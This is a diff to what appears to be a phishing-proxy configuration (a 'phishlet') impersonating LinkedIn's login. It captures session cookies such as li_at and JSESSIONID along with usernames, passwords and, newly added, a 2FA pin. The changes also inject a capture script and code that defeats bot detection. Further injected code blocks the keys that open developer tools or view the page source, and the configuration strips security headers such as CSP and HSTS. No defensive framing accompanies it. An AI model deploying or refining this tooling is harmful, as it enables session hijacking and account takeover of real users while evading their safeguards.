@@ -10,11 +10,15 @@ proxy_hosts:
     target: "media.licdn.com"
   - subdomain: "api"
     target: "api.linkedin.com"
+  - subdomain: "platform"
+    target: "platform.linkedin.com"
 auth_urls: 
   - "/login"
   - "/checkpoint/lg/login-submit"
+  - "/uas/login"
 landing_path: 
   - "/login"
+  - "/uas/login"
 auth_tokens:
   - {type: "cookie", name: "li_at"}
   - {type: "cookie", name: "JSESSIONID"}
@@ -23,33 +27,53 @@ auth_tokens:
   - {type: "cookie", name: "bcookie"}
   - {type: "cookie", name: "bscookie"}
   - {type: "cookie", name: "visit"}
+  - {type: "cookie", name: "li_sugr"}
+  - {type: "cookie", name: "lidc"}
+  - {type: "cookie", name: "lissc"}
 credentials:
   - {type: "post_param", name: "session_key", regex: null}
   - {type: "post_param", name: "session_password", regex: null}
   - {type: "post_param", name: "username", regex: null}
   - {type: "post_param", name: "password", regex: null}
+  - {type: "post_param", name: "pin", regex: null} # 2FA pin
 injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
   - trigger_path: "/login"
     position: "body_end"
     content: |
       (function(){
         // LinkedIn Anti-Bot Evasion
         Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
+        
         // Disable right-click for security
         document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+          if(e.keyCode == 123) return false;
+          if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+          if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+          if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        }
       })();
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
   - {action: "remove", name: "Strict-Transport-Security"}
+  - {action: "remove", name: "X-Content-Type-Options"}
+  - {action: "remove", name: "Referrer-Policy"}
 path_rewrites:
   - {pattern: "^/$", replace: "/login", methods: ["GET"]}
 cookie_rewrites: []
 blocklist:
-  - {pattern: "analytics|/li/px|/instrumentation", mimes: ["text/javascript"], max_kb: 512}
+  - {pattern: "analytics|/li/px|/instrumentation|/collect", mimes: ["text/javascript", "image/gif"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"checkpoint\"], form[action*=\"login\"]", action_to: "/uas/sessions"}
 bridges:
   - {prefix: "/_liapi/", target_host: "api.linkedin.com", strip_prefix: true, cors: "allow_all"}
   - {prefix: "/_listatic/", target_host: "static.licdn.com", strip_prefix: true, cors: "allow_all"}
   - {prefix: "/_limedia/", target_host: "media.licdn.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_liplatform/", target_host: "platform.linkedin.com", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
+  headers: ["*"]
